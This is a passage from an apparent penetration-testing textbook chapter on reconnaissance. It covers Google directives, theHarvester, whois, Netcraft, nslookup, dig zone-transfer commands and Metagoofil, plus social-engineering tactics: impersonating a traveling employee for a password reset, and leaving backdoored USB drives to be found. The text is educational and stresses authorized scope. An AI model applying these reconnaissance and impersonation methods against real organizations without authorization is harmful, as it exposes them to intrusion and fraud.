google cache. the following search will pro-\n', b'vide us with the cached version of the syngress homepage:\n', b'cache:syngress.com\n', b'it is important that you understand that clicking on any of the Urls will bring \n', b'you to the live website, not the cached version. if you want to view specific \n', b'cached pages, you will need to modify your search.\n', b'the last directive we will cover here is \xe2\x80\x9cfiletype:\xe2\x80\x9d. we can utilize \xe2\x80\x9cfiletype:\xe2\x80\x9d to \n', b'search for specific file extensions. this is extremely useful for finding specific \n', b'types of files on your target\xe2\x80\x99s website. for example, to return only hits that con-\n', b'tain Pdf documents, you would issue the following command:\n', b'filetype:pdf\n', b'this powerful directive is a great way to find links to specific files like .doc, xlsx, \n', b'ppt, txt, and many more. Your options are nearly limitless.\n', b'for additional power, we can combine multiple directives into the same search. \n', b'for example, if we want to find all the PowerPoint presentations on the dsU \n', b'website, you would enter the following command into the search box:\n', b'site:dsu.edu filetype:ppt\n', b'in this case, every result that is returned is a PPt file and comes directly from \n', b'the dsu.edu domain! figure 2.2 shows a screenshot of two searches: the first \n', b'fIGURE 2.2\n', b'The Power of Google Directives.\n', b'\x0cReconnaissance ChApTER 2\n', b'25\n', b'utilizes google directives and the second shows the results from a traditional \n', b'search. Utilizing google directives has drastically reduced the number of hits \n', b'(by 33,364!).\n', b'there are many other types of directives and google hacks that you should \n', b'become familiar with. Along with google, it is important that you become \n', b'efficient with several other search engines as well. oftentimes, different search \n', b'engines will provide different results, even when you search for the same key-\n', b'words. As a penetration tester conducting reconnaissance, you want to be as \n', b'thorough as possible.\n', b'As a final warning, it should be pointed out that these passive searches are only \n', b'passive as long as you are searching. once you make a connection with the \n', b'target system (by clicking on any of the links), you are back to active mode. Be \n', b'aware that active reconnaissance without prior authorization is likely an illegal \n', b'activity.\n', b'once you have thoroughly reviewed the target\xe2\x80\x99s web page and conducted \n', b'exhaustive searches utilizing google and other search engines, it is important to \n', b'explore other corners of the internet. newsgroups and Bulletin Board systems \n', b'like Usenet and google groups can be very useful for gathering information \n', b'about a target. it is not uncommon for people to use these discussion boards \n', b'to post and receive help with technical issues. Unfortunately (or fortunately, \n', b'depending on which side of the coin you are looking at), employees often \n', b'post very detailed questions including sensitive and confidential information. \n', b'for example, consider a network administrator who is having trouble getting \n', b'his firewall properly configured. it is not uncommon to witness discussions \n', b'on public forums where these admins will post entire sections of their config \n', b'files. to make matters worse, many people post using their company e-mail \n', b'addresses. this information is a virtual gold mine for an attacker.\n', b'even if our network admin is smart enough not to post detailed configuration \n', b'files, it is hard to get support from the community without inadvertently leak-\n', b'ing some information. reading even carefully scrubbed posts will often reveal \n', b'specific software version, hardware models, current configuration information, \n', b'and the like about internal systems. All this information should be filed away \n', b'for future use.\n', b'Public forums are an excellent way to share information and receive technical \n', b'help. However, when using these resources, be careful to use a slightly more \n', b'anonymous e-mail address like gmail or Hotmail, rather than your corporate \n', b'address.\n', b'the explosive growth in social media like facebook, myspace, and twitter pro-\n', b'vides us with new avenues to mine data about our targets. when performing \n', b'reconnaissance, it is a good idea to use these sites to our advantage. consider \n', b'the following fictitious example: You are conducting a penetration test against \n', b'a small company. Your reconnaissance has led you to discover that the network \n', b'administrator for the company has a twitter and facebook account. Utilizing a \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'26\n', b'little social engineering you befriend the unsuspecting admin and follow him \n', b'on both facebook and twitter. After a few weeks of boring posts, you strike the \n', b'jackpot. He makes a post on facebook that says \xe2\x80\x9cgreat. firewalled died with-\n', b'out warning today. new one being sent over-night. looks like i\xe2\x80\x99ll be pulling an \n', b'all-nighter tomorrow to get things back to normal.\xe2\x80\x9d\n', b'Another example would be a Pc tech who posts, \xe2\x80\x9cProblem with latest \n', b'microsoft patch, had to uninstall. will call ms in the morning.\xe2\x80\x9d\n', b'or even the following, \xe2\x80\x9cJust finished the annual budget process. looks like i\xe2\x80\x99m \n', b'stuck with that server 2000 for another year.\xe2\x80\x9d\n', b'Although these examples may seem a bit over the top, you will be surprised \n', b'at the amount of information you can collect by simply monitoring what \n', b'employees post online.\n', b'ThE hARvESTER: DISCOvERING AND  \n', b'LEvERAGING E-MAIL ADDRESSES\n', b'An excellent tool to use in reconnaissance is the Harvester. the Harvester is \n', b'a simple but highly effective Python script written by christian martorella at \n', b'edge security. this tool allows us to quickly and accurately catalog both e-mail \n', b'addresses and subdomains that are directly related to our target.\n', b'it is important to always use the latest version of the Harvester as many search \n', b'engines regularly update and change their systems. even subtle changes to a \n', b'search engine\xe2\x80\x99s behavior can render automated tools ineffective. in some cases, \n', b'search engines will actually filter the results before returning information to \n', b'you. many search engines also employ throttling techniques that will attempt \n', b'to prevent you from running automated searches.\n', b'the Harvester can be used to search google, Bing, and PgP servers for e-mails, \n', b'hosts, and subdomains. it can also search linkedin for user names. most peo-\n', b'ple assume their e-mail address is benign. we have already discussed the dan-\n', b'gers of posting to public forums using your corporate e-mail address; however, \n', b'there are additional hazards you should be aware of. let us assume during your \n', b'reconnaissance you discover the e-mail address of an employee from your tar-\n', b'get organization. By twisting and manipulating the information before the \xe2\x80\x9c@\xe2\x80\x9d \n', b'symbol, we should be able to create a series of potential network usernames. \n', b'it is not uncommon for organizations to use the exact same user names and \n', b'e-mail addresses (before the \xe2\x80\x9c@\xe2\x80\x9d symbol). with a handful of prospective user-\n', b'names, we can attempt to brute force our way into any services, like ssH, VPns, \n', b'or ftP, that we (will) discover during the next step 2 (scanning).\n', b'the Harvester is built into Backtrack. to access the Harvester, use the following \n', b'steps:\n', b'1. click on the kstart dragon, located in the lower left corner of your screen.\n', b'2. Highlight \xe2\x80\x9cBacktrack\xe2\x80\x9d at the top of the menu.\n', b'\x0cReconnaissance ChApTER 2\n', b'27\n', b'3. Highlight \xe2\x80\x9cinformation gathering.\xe2\x80\x9d\n', b'4. Highlight \xe2\x80\x9cAll.\xe2\x80\x9d\n', b'5. select \xe2\x80\x9ctheHarvester\xe2\x80\x9d (note, tools are listed in alphabetical order).\n', b'You can also open a terminal window and navigate to the Harvester directory \n', b'by issuing the following command:\n', b'cd /pentest/enumeration/google/theharvester\n', b'regardless of whether you have downloaded the Harvester or used the ver-\n', b'sion installed in Backtrack, we will use it to collect additional information \n', b'about our target. Be sure you are in theHarvester folder and run the following \n', b'command:\n', b'./theHarvester.py \xe2\x80\x93d syngress.com \xe2\x80\x93l 10 \xe2\x80\x93b google\n', b'this command will search for e-mails, subdomains, and hosts that belong to \n', b'syngress.com. figure 2.3 shows our results.\n', b'Before discussing the results of our tool, let us examine the command a little \n', b'closer. \xe2\x80\x9c./theHarvester.py\xe2\x80\x9d is used to invoke the tool. A lowercase \xe2\x80\x9c\xe2\x80\x93d\xe2\x80\x9d is \n', b'used to specify the target domain. A lowercase \xe2\x80\x9c\xe2\x80\x93l\xe2\x80\x9d (that is an l not a 1) is \n', b'used to limit the number of results returned to us. in this case, the tool was \n', b'instructed to return only 10 results. the \xe2\x80\x9c\xe2\x80\x93b\xe2\x80\x9c is used to specify what public \n', b'repository we want to search. we can choose among google, Bing, PgP, or \n', b'linkedin\xe2\x80\x94for this example, we chose to search using google.\n', b'now that you fully understand the command that was run, let us take a look at \n', b'the results.\n', b'As you can see, the Harvester was effective in locating at least two e-mail \n', b'addresses that could be of value to us. Please note, the e-mail addresses in the \n', b'screenshot have been circled and obfuscated. the Harvester was also successful \n', b'ADDITIONAL RESOURCES\n', b'If you are using an operating system other than Backtrack, you can download the tool \n', b'directly from Edge Security at: http://www.edge-security.com. Once you have got it \n', b'downloaded, you can unpack the downloaded tar file by running the following command \n', b'in a terminal:\n', b'tar xf theHarvester\n', b'Please note the capital \xe2\x80\x9cH\xe2\x80\x9d that is used when untarring the code. Linux is case \n', b'sensitive, so the operating system sees a difference between \xe2\x80\x9ctheHarvester\xe2\x80\x9d and \n', b'\xe2\x80\x9ctheharvester.\xe2\x80\x9d You will need to pay attention to the executable to determine if you \n', b'should use a capital or lowercase \xe2\x80\x9ch.\xe2\x80\x9d If the cases do not match exactly, you will \n', b'typically get a message saying \xe2\x80\x9cno such file or directory.\xe2\x80\x9d This is a good indication that \n', b'you have mistyped the name of the file.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'28\n', b'in finding at least two additional subdomains. Both \xe2\x80\x9cbooksite.syngress.com\xe2\x80\x9d \n', b'and \xe2\x80\x9cebook__www.syngress.com\xe2\x80\x9d need to be fully recon\xe2\x80\x99d. we simply add these \n', b'new domains to our target list and begin the reconnaissance process again.\n', b'step 1 of reconnaissance is very cyclical because in-depth reconnaissance often \n', b'leads to the discovery of new targets, which, in turn, leads to additional recon-\n', b'naissance. As a result, the amount of time to complete this phase will vary \n', b'from several hours to several weeks. remember, a determined malicious hacker \n', b'understands not only the power of good reconnaissance but also that of a \n', b'nearly limitless amount of time. As an aspiring penetration tester, you should \n', b'devote as much time as possible to practicing and conducting information \n', b'gathering.\n', b'WhOIS\n', b'A very simple but effective means for collecting additional information about \n', b'our target is whois. the whois service allows us to access specific information \n', b'about our target including the iP addresses or host names of the company\xe2\x80\x99s \n', b'domain name systems (dns) servers and contact information usually con-\n', b'taining an address and phone number.\n', b'whois is built into the linux operating system. the simplest way to use this \n', b'service is to open a terminal and enter the following command:\n', b'whois target_domain\n', b'fIGURE 2.3\n', b'Output of the Harvester.\n', b'\x0cReconnaissance ChApTER 2\n', b'29\n', b'for example, to find out information about syngress, we would issue the fol-\n', b'lowing command: \xe2\x80\x9cwhois syngress.com.\xe2\x80\x9d figure 2.4 shows a partial output \n', b'from the result of this tool.\n', b'it is important to record all the information and pay special attention to the \n', b'dns servers. if the dns servers are listed by name only, as shown in figure \n', b'2.4, we will use the Host command to translate those names into iP addresses. \n', b'we will discuss the host command in the next section. You can also use a web \n', b'browser to search whois. By navigating to http://www.whois.net, you can \n', b'search for your target in the \xe2\x80\x9cwHois lookup\xe2\x80\x9d box as shown in figure 2.5.\n', b'Again it is important to closely review the information you are presented with. \n', b'sometimes, the output will not provide many details. we can often access \n', b'these additional details by querying the specific whois server listed in the out-\n', b'put of our original search. figure 2.6 shows an example of this.\n', b'fIGURE 2.4\n', b'Partial Output from a Whois Query.\n', b'fIGURE 2.5\n', b'Whois.net\xe2\x80\x94A Web-Based Lookup Tool.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'30\n', b'we can conduct a further whois search by following the link provided in the \n', b'\xe2\x80\x9creferral Url:\xe2\x80\x9d field. You may have to search the webpage for a link to their \n', b'whois service. By using safename\xe2\x80\x99s whois service, we can extract a significantly \n', b'larger amount of information as shown here:\n', b'The Registry database contains ONLY .COM, .NET, .EDU domains and\n', b'Registrars.[whois.safenames.net]\n', b'Safenames Whois Server Version 2.0\n', b'Domain Name: SYNGRESS.COM\n', b' [REGISTRANT]\n', b'   Organisation Name: Elsevier Ltd\n', b'   Contact Name:      Domain Manager\n', b'   Address Line 1:    The Boulevard\n', b'   Address Line 2:    Langford Lane, Kidlington\n', b'   City/Town:         Oxfordshire\n', b'   State/Province:\n', b'   Zip/Postcode:      OX5 1GB\n', b'   Country:           UK\n', b'   Telephone:         \xee\x80\xb144 (18658) 43830\n', b'   Fax:               \xee\x80\xb144 (18658) 53333\n', b'   Email:             domainsupport@elsevier.com\n', b' [ADMIN]\n', b'   Organisation Name: Safenames Ltd\n', b'   Contact Name:      International Domain Administrator\n', b'   Address Line 1:    PO Box 5085\n', b'   Address Line 2:\n', b'   City/Town:         Milton Keynes MLO\n', b'   State/Province:    Bucks\n', b'   Zip/Postcode:      MK6 3ZE\n', b'   Country:           UK\n', b'   Telephone:         \xee\x80\xb144 (19082) 00022\n', b'   Fax:               \xee\x80\xb144 (19083) 25192\n', b'   Email:             hostmaster@safenames.net\n', b'fIGURE 2.6\n', b'Whois Output Showing Where to Go for Additional Details.\n', b'Openmirrors.com\n', b'\x0cReconnaissance ChApTER 2\n', b'31\n', b' [TECHNICAL]\n', b'   Organisation Name:       International Domain Tech\n', b'   Contact Name:            International Domain Tech\n', b'   Address Line 1:          PO Box 5085\n', b'   Address Line 2:\n', b'   City/Town:               Milton Keynes MLO\n', b'   State/Province:          Bucks\n', b'   Zip/Postcode:            MK6 3ZE\n', b'   Country:                 UK\n', b'   Telephone:               \xee\x80\xb144 (19082) 00022\n', b'   Fax:                     \xee\x80\xb144 (19083) 25192\n', b'   Email:                   tec@safenames.net\n', b'NETCRAfT\n', b'Another great source of information is netcraft. You can visit their site at \n', b'http://news.netcraft.com. start by searching for your target in the \xe2\x80\x9cwhat\xe2\x80\x99s that \n', b'site running?\xe2\x80\x9d textbox as shown in figure 2.7.\n', b'netcraft will return any websites it is aware of that contain your search words. \n', b'in our example we are presented with three sites: syngress.com, www.syngress.\n', b'com, and booksite.syngress.com. if any of these sites have escaped our previous \n', b'searches, it is important to add them to our potential target list. the returned \n', b'results page will allow us to click on a \xe2\x80\x9csite report.\xe2\x80\x9d Viewing the site report \n', b'should provide us with some valuable information as shown in figure 2.8.\n', b'As you can see, the site report provides us with some great information about \n', b'our target including the iP address and os of the web server as well as the dns \n', b'server. once again all this information should be cataloged and recorded.\n', b'hOST\n', b'oftentimes, our reconnaissance efforts will result in host names rather than iP \n', b'addresses. when this occurs, we can use the \xe2\x80\x9chost\xe2\x80\x9d tool to perform a transla-\n', b'tion for us. the host tool is built into Backtrack. we can access it by opening a \n', b'terminal and typing:\n', b'root@bt~# host target_hostname\n', b'fIGURE 2.7\n', b'Netcraft Search Option.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'32\n', b'in our previous searches, we uncovered a dns server with the host name \xe2\x80\x9cns1.\n', b'dreamhost.com.\xe2\x80\x9d to translate this into an iP address, we would enter the fol-\n', b'lowing command in a terminal:\n', b'host ns1.dreamhost.com\n', b'figure 2.9 shows the result of this tool.\n', b'the host command can also be used in reverse. it can be used to translate iP \n', b'addresses into host names. to perform this task, simply enter:\n', b'root@bt~# host IP address\n', b'Using the \xe2\x80\x9c-a\xe2\x80\x9d switch will provide you with verbose output and possibly reveal \n', b'additional information about your target. it is well worth your time to review \n', b'the \xe2\x80\x9chost\xe2\x80\x9d documentation and help files. You can do so by issuing the \xe2\x80\x9cman \n', b'host\xe2\x80\x9d command in a terminal window. this help file will allow you to become \n', b'familiar with the various options that can be used to provide additional func-\n', b'tionality to the \xe2\x80\x9chost\xe2\x80\x9d tool.\n', b'EXTRACTING INfORMATION fROM DNS\n', b'dns servers are an excellent target for hackers and penetration testers. they \n', b'usually contain information that is considered highly valuable to attackers. \n', b'dns is a core component of both our local networks and the internet. Among \n', b'fIGURE 2.9\n', b'Host Command Output.\n', b'fIGURE 2.8\n', b'Site Report for Syngress.com.\n', b'\x0cReconnaissance ChApTER 2\n', b'33\n', b'other things, dns is responsible for the process of translating domain names \n', b'to iP addresses. As humans, it is much easier for us to remember \xe2\x80\x9cgoogle.com\xe2\x80\x9d \n', b'rather than http://74.125.95.105. However, machines prefer the reverse. dns \n', b'serves as the middle man to perform this translation process.\n', b'As penetration testers, it is important to focus on the dns servers that belong \n', b'to our target. the reason is simple. in order for dns to function properly, it \n', b'needs to be aware of both the iP address and the corresponding domain \n', b'name of each computer on its network. in terms of reconnaissance, gaining \n', b'full access to a company\xe2\x80\x99s dns server is like finding a pot of gold at the end \n', b'of a rainbow. or maybe, more accurately, it is like finding a blueprint to the \n', b'organization. But in this case the blueprint contains a full listing of internal \n', b'iP addresses that belong to our target. remember one of the key elements of \n', b'information gathering is to collect iP addresses that belong to the target.\n', b'Aside from the pot of gold, another reason why picking on dns is so enjoy-\n', b'able is that in many cases these servers tend to operate on the \xe2\x80\x9cif it isn\xe2\x80\x99t broke, \n', b'don\xe2\x80\x99t touch it\xe2\x80\x9d principle.\n', b'inexperienced network administrators often regard their dns servers with sus-\n', b'picion and mistrust. oftentimes, they choose to ignore the box completely \n', b'because they do not fully understand it. As a result touching, patching, updat-\n', b'ing, or changing configurations on the dns server is often a low priority. Add \n', b'this to the fact that most dns servers appear to be very stable (as long as the \n', b'administrator is not monkeying with it) and you have a recipe for a security \n', b'disaster. these admins wrongly learn early in their career that the less they \n', b'mess with their dns servers, the less trouble it seemed to cause them.\n', b'As a penetration tester, given the number of misconfigured and unpatched \n', b'dns servers that abound today, it is natural to assume that many current net-\n', b'work admins operate under this same principle.\n', b'if the above statements are true in even a small number of organizations, we \n', b'are left with valuable targets that have a high probability of being unpatched \n', b'or out of date. so the next logical question becomes, how do we access this \n', b'virtual pot of gold? Before we can begin the process of examining a dns server, \n', b'we need an iP address. earlier in our reconnaissance, we came across several \n', b'references to dns. some of these references were by host names, whereas oth-\n', b'ers were by iP addresses. Using the host command, we can translate any host \n', b'names into iP addresses and add these iPs to the potential target list. Again, \n', b'you must be sure to double- and triple-check that the iP you collect is within \n', b'your authorized scope before continuing.\n', b'now that we have a list of dns iP addresses that belong to or serve our tar-\n', b'get we can begin the process of interrogating dns to extract information. \n', b'Although it is becoming more rare to find, one of our first tasks when interact-\n', b'ing with a target dns is to attempt a zone transfer.\n', b'remember dns servers contain a series of records that match up the iP address \n', b'and host name for all the devices that the servers are aware of. many networks \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'34\n', b'deploy multiple dns servers for the sake of redundancy or load balancing. As \n', b'a result, dns servers need a way to share information. this \xe2\x80\x9csharing\xe2\x80\x9d process \n', b'occurs through the use of a zone transfer. during a zone transfer, also com-\n', b'monly referred to as Axfr, one dns server will send all the host-to-iP map-\n', b'pings it contains to another dns server. this process allows multiple dns \n', b'servers to stay in sync.\n', b'even if we are unsuccessful in performing a zone transfer, we should still spend \n', b'time investigating any dns servers that fall within our authorized scope.\n', b'NS Lookup\n', b'the first tool we will use to examine dsn is ns lookup. ns lookup is a tool \n', b'that can be used to query dns servers and potentially obtain records about \n', b'the various hosts of which it is aware. ns lookup is built into many versions \n', b'of linux including Backtrack and is even available via the windows command \n', b'prompt! ns lookup operates very similarly between the various operating sys-\n', b'tems; however, you should always review the specifics for your particular sys-\n', b'tem. You can do so in linux by reviewing the ns lookup man pages. this is \n', b'accomplished by opening a terminal and typing:\n', b'root@bt~# man nslookup\n', b'ns lookup is a tool that can be run in interactive mode. this simply means we \n', b'will first invoke the program and then feed it the particular switches we need \n', b'to make it function properly. we begin using ns lookup by opening a termi-\n', b'nal and entering:\n', b'root@bt~# nslookup\n', b'By issuing the \xe2\x80\x9cnslookup\xe2\x80\x9d command, we start the ns lookup tool from the \n', b'operating system. After typing \xe2\x80\x9cnslookup\xe2\x80\x9d and hitting enter, your usual \xe2\x80\x9c#\xe2\x80\x9d \n', b'prompt will be replaced with a \xe2\x80\x9c>\xe2\x80\x9d prompt. At this point you can enter the \n', b'additional information required for ns lookup to function.\n', b'we begin feeding commands to ns lookup by entering the \xe2\x80\x9cserver\xe2\x80\x9d keyword \n', b'and an iP address of the dns server you want to query. An example follows:\n', b'server 8.8.8.8\n', b'ns lookup will simply accept the command and present you with another \xe2\x80\x9c>\xe2\x80\x9d \n', b'prompt. next, we specify the type of record we are looking for. during the recon-\n', b'naissance process, there are many types of records that you may be interested in. \n', b'for a complete listing of the various dns record types and their description, you \n', b'can use your newly acquired google skills! if you are looking for general infor-\n', b'mation, you should set the type to any by using the keyword \xe2\x80\x9cany\xe2\x80\x9d:\n', b'set type \xee\x80\xb5 any\n', b'if you are looking for specific information from the dns server such as the iP \n', b'address of the mail server that handles e-mail for the target organization, we \n', b'would use the \xe2\x80\x9cset type 5 mx\xe2\x80\x9d.\n', b'\x0cReconnaissance ChApTER 2\n', b'35\n', b'we wrap up our initial dns interrogation with ns lookup by entering the tar-\n', b'get domain after the next \xe2\x80\x9c>\xe2\x80\x9d prompt.\n', b'suppose you wanted to know what mail server is used to handle the e-mail for \n', b'syngress. in a previous example, we determined that one of syngress\xe2\x80\x99s name \n', b'servers was \xe2\x80\x9cns1.dreamhost.com\xe2\x80\x9d. Here again we can use the host tool to \n', b'quickly determine what iP address is associated with ns1.dreamhost.com. with \n', b'this information in hand, we can use ns lookup to query dns and find mail \n', b'server for syngress. figure 2.10 shows an example of this process; the name of \n', b'the e-mail server has been highlighted (in the bottom right of the screenshot) \n', b'and now needs to be added to our potential target list.\n', b'Dig\n', b'Another great tool for extracting information from dns is \xe2\x80\x9cdig.\xe2\x80\x9d to work with \n', b'dig, we simply open a terminal and enter the following command:\n', b'dig @target_ip\n', b'naturally, you will need to replace the \xe2\x80\x9ctarget_ip\xe2\x80\x9d with the actual iP \n', b'address of your target. Among other things, dig makes it very simple to \n', b'attempt a zone transfer. recall that a zone transfer is used to pull multiple \n', b'records from a dns server. in some cases, a zone transfer can result in the tar-\n', b'get dns server sending all the records it contains. this is especially valuable if \n', b'your target does not distinguish between internal and external iPs when con-\n', b'ducting a zone transfer. we can attempt a zone transfer with dig by using the \n', b'\xe2\x80\x9c\xe2\x80\x93t AXFR\xe2\x80\x9d switch.\n', b'if we wanted to attempt a zone transfer against a fictitious dns server with an \n', b'iP address of 192.168.1.23 and a domain name of \xe2\x80\x9cexample.com\xe2\x80\x9d we would \n', b'issue the following command in a terminal window:\n', b'dig @192.168.1.23 example.com \xe2\x80\x93t AXFR\n', b'fIGURE 2.10\n', b'Using Host and NS Lookup to Determine the E-mail Server of Our Target.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'36\n', b'if zone transfers are allowed and not restricted, you will be presented with a \n', b'listing of host and iP addresses from the target dns server that relate to your \n', b'target domain.\n', b'Backtrack has many additional tools that can be used to interact with dns. \n', b'these tools should be explored and utilized once you have a solid understand-\n', b'ing of how dns works. Please see the end of this chapter for a brief discussion \n', b'of some additional tools you may want to use when conducting a penetration \n', b'test involving dns.\n', b'EXTRACTING INfORMATION fROM E-MAIL SERvERS\n', b'e-mail servers can provide a wealth of information for hackers and penetration \n', b'testers. in many ways, e-mail is like a revolving door to your target\xe2\x80\x99s organiza-\n', b'tion. Assuming your target is hosting their own e-mail server, this is often a \n', b'great place to attack. it is important to remember, \xe2\x80\x9cYou can\xe2\x80\x99t block what you \n', b'must let in.\xe2\x80\x9d in other words, for e-mail to function properly, external traffic \n', b'must pass through your border devices like routers and firewalls, to an internal \n', b'machine, typically somewhere inside your protected networks.\n', b'As a result of this, we can often gather significant pieces of information by \n', b'interacting directly with the e-mail sever. one of the first things to do when \n', b'attempting to recon an e-mail server is to send an e-mail to the organization \n', b'with an empty .bat file or a nonmalicious .exe file like calc.exe. in this case, the \n', b'goal is to send a message to the target e-mail server inside the organization in \n', b'the hope of having the e-mail server inspect, and then reject the message.\n', b'once the rejected message is returned back to us, we can attempt to extract \n', b'information about the target e-mail server. in many cases, the body of the \n', b'message will include a precanned write-up explaining that the server does \n', b'not accept e-mails with potentially dangerous extensions. this message often \n', b'indicates the specific vendor and version of antivirus that was used to scan the \n', b'e-mail. As an attacker this is a great piece of information to have.\n', b'Having a return message from a target e-mail server also allows us to inspect \n', b'the headers of the e-mail. inspecting the internet headers will often allow us to \n', b'extract some basic information about the e-mail server, including iP addresses \n', b'and the specific software versions or brand of e-mail server running. knowing \n', b'the iP address and software versions can be incredibly useful when we move \n', b'into the exploitation phase (step 3).\n', b'MetaGoofil\n', b'Another excellent information gathering tools is \xe2\x80\x9cmetagoofil.\xe2\x80\x9d metagoofil is \n', b'a metadata extraction tool that is written by the same folks who brought us \n', b'the Harvester. metadata is often defined as data about data. when you create a \n', b'document like microsoft word or a PowerPoint presentation, additional data \n', b'is created and stored within your file. this data often includes various pieces of \n', b'information that describe the document including the file name, the file size, \n', b'\x0cReconnaissance ChApTER 2\n', b'37\n', b'the file owner or username of the person who created the file, and the location \n', b'or path where the file was saved. this process occurs automatically without any \n', b'user input or interaction.\n', b'the ability of an attacker to read this information may present some unique \n', b'insights into the target organization including usernames, system names, files \n', b'shares, and other goodies. metagoofil is a tool that scours the internet look-\n', b'ing for documents that belong to your target. After finding these documents, \n', b'metagoofil downloads them and attempts to extract useful metadata.\n', b'metagoofil is built into Backtrack and can be found by navigating to the \n', b'information gathering section off of the Backtrack option in the All Programs \n', b'menu. likewise, you can open a terminal window and enter the following \n', b'command:\n', b'cd /pentest/enumeration/google/metagoofil\n', b'After navigating to the metagoofil directory, it is a good idea to create a \n', b'\xe2\x80\x9cfiles\xe2\x80\x9d folder. the purpose of this folder is to hold all the target files that will \n', b'be downloaded; this keeps the original directory clean. You can create a new \n', b'folder by entering:\n', b'mkdir files\n', b'with this directory setup, you can run metagoofil by issuing the following \n', b'command:\n', b'./metagoofil.py -d syngress.com \xe2\x80\x93f all -o results \xe2\x80\x93t files\n', b'let us examine the details of this command. \xe2\x80\x9c./metagoofil.py\xe2\x80\x9d is used to \n', b'invoke the metagoofil python script. do not forget to put the \xe2\x80\x9c./\xe2\x80\x9d in front \n', b'of the command. the \xe2\x80\x9c\xe2\x80\x93d\xe2\x80\x9d switch is used to specify the target domain to be \n', b'searched. the \xe2\x80\x9c\xe2\x80\x93f\xe2\x80\x9d switch is used to specify which type or types of files you want \n', b'metagoofil to attempt to locate. Utilizing the \xe2\x80\x9call\xe2\x80\x9d switch will force metagoofil \n', b'to locate and download all the different format types that it can process includ-\n', b'ing ppt, pdf, xls, odp, docx and others. You can also specify individual file types \n', b'to limit the returned results. we use the \xe2\x80\x9c\xe2\x80\x93o\xe2\x80\x9d switch to specify the name of the \n', b'report that metagoofil will generate for us. lastly we specify the folder where we \n', b'want to store each of the files that metagoofil locates and downloads. in an ear-\n', b'lier step we created a \xe2\x80\x9cfiles\xe2\x80\x9d directory; as a result, our command \xe2\x80\x9c\xe2\x80\x93f files\xe2\x80\x9d will \n', b'save each of the discovered documents into this folder.\n', b'while the output from metagoofil against syngress reveals nothing, below \n', b'you will find a sample of the tool\xe2\x80\x99s output from a recent penetration test that \n', b'clearly provides additional value and should be included with our reconnais-\n', b'sance data.\n', b'C:\\Documents and Settings\\dennisl\\My Documents\\\n', b'this example is rich with information. first, it provides us with a valid net-\n', b'work username \xe2\x80\x9cdennisl.\xe2\x80\x9d second, it clearly shows that dennis uses a windows \n', b'machine.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'38\n', b'SOCIAL ENGINEERING\n', b'no discussion of reconnaissance would be complete without including social \n', b'engineering. many people would argue that social engineering is one of the \n', b'most simple and effective means for gathering information about a target.\n', b'social engineering is the process of exploiting the \xe2\x80\x9chuman\xe2\x80\x9d weakness that is \n', b'inherent in every organization. when utilizing social engineering, the attacker\xe2\x80\x99s \n', b'goal is to get an employee to divulge some information that should be kept \n', b'confidential.\n', b'let us assume you are conducting a penetration test on an organization. \n', b'during your early reconnaissance, you discover an e-mail address for one of \n', b'the company\xe2\x80\x99s sales people. You understand that sales people are highly likely \n', b'to return product inquiry e-mails. As a result, you sent an e-mail from an anon-\n', b'ymous address feigning interest in a particular product. in reality, you did not \n', b'care about the product. the real purpose of sending the e-mail is to get a reply \n', b'from the sales person so you can review the e-mail headers contained in the \n', b'response. this process will allow you to gather additional information about \n', b'the company\xe2\x80\x99s internal e-mail servers.\n', b'let us take our social engineering example one step further. suppose our sales-\n', b'man\xe2\x80\x99s name is Ben owned (we found this information during our reconnais-\n', b'sance of the company website and in the signature of his e-mail response). \n', b'let us assume that in this example, when you sent the employee the product \n', b'inquiry e-mail, you received an automatic reply with the notification that Ben \n', b'owned was \xe2\x80\x9ccurrently out of the office travelling overseas\xe2\x80\x9d and \xe2\x80\x9cwould be \n', b'gone for two weeks with only limited e-mail access.\xe2\x80\x9d\n', b'A classic example of social engineering would be to impersonate Ben owned \n', b'and call the target company\xe2\x80\x99s tech support number asking for help resetting \n', b'your password because you are overseas and cannot access your webmail. if \n', b'you are lucky, the tech support people will believe your story and reset the \n', b'password. Assuming they use the same password, you now have access to Ben \n', b'owned\xe2\x80\x99s e-mail and other network resources like VPn for remote access, or \n', b'ftP for uploading sales figures and customer orders.\n', b'social engineering, like reconnaissance in general, takes both time and prac-\n', b'tice. not everyone makes a good social engineer. in order to be successful, you \n', b'must be supremely confident, knowledgeable of the situation, and flexible \n', b'enough to go \xe2\x80\x9coff script.\xe2\x80\x9d if you are conducting social engineering over the \n', b'phone, it can be extremely helpful to have detailed and well-written notes in \n', b'case you are asked about some obscure detail.\n', b'Another example of social engineering is to leave UsB thumb drives or cds at \n', b'the target organization. the thumb drives should be distributed to several loca-\n', b'tions in or near the organization. the parking lot, the lobby, the bathroom, \n', b'and an employee\xe2\x80\x99s desk are all great \xe2\x80\x9cdrop\xe2\x80\x9d locations. it is human nature for \n', b'most people to insert the thumb drive or cd into their Pc just to see what is \n', b'Openmirrors.com\n', b'\x0cReconnaissance ChApTER 2\n', b'39\n', b'on the drive. in this example though, the thumb drive or cd is preloaded with \n', b'a self-executing backdoor program that automatically launches when the drive \n', b'is inserted into the computer. the backdoor is capable of bypassing the com-\n', b'pany firewall and will dial home to the attacker\xe2\x80\x99s computer, leaving the target \n', b'exposed and giving the attacker a clear channel into the organization. we will \n', b'discuss the topic of backdoors in chapter 6.\n', b'SIfTING ThROUGh ThE INTEL TO fIND ATTACKABLE \n', b'TARGETS\n', b'once you have completed the steps above, you need to schedule some time \n', b'to closely review all the reconnaissance and information you have gathered. \n', b'in most cases, even light reconnaissance should produce a mountain of data. \n', b'once the reconnaissance step is completed, you should have a solid under-\n', b'standing of your target including the organization, structure, and even technol-\n', b'ogies deployed inside the company.\n', b'while conducting the review process, it is a good idea to create a single list that \n', b'can be used as a central repository for recording iP addresses. You should also \n', b'keep separate lists that are dedicated to e-mail addresses, host names, and Urls.\n', b'Unfortunately, most of the data you collected will not be directly attackable. \n', b'during the process of reviewing your findings, be sure to transform any rele-\n', b'vant, non-iP-based information, into an iP address. Using google and the host \n', b'command you should be able to extract additional iPs that relate to your tar-\n', b'get. Add these to the iP list.\n', b'After we have thoroughly reviewed the collected reconnaissance and trans-\n', b'formed the data into attackable targets, we should have a list of iPs that \n', b'either belong to, serve, or are related to the target. As always, it is important \n', b'to remember your authorized scope 